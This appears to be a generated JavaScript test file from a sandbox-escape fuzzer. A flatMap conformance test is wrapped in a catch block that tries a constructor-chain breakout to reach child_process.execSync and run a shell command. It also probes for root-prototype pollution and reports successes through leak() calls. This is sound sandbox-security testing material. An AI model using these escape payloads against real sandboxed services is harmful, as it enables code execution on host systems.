try {
    assert.compareArray([
        1,
        2
    ].flatMap(function (e) {
        return [
            e,
            e * 2
        ];
    }), [
        1,
        2,
        2,
        4
    ], 'array depth is 1');
    var result = [
        1,
        2,
        3
    ].flatMap(function (ele) {
        return [[ele * 2]];
    });
    assert.sameValue(result.length, 3, 'array depth is more than 1 - length');
    assert.compareArray(result[0], [2], 'array depth is more than 1 - 1st element');
    assert.compareArray(result[1], [4], 'array depth is more than 1 - 2nd element');
    assert.compareArray(result[2], [6], 'array depth is more than 1 - 3rd element');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}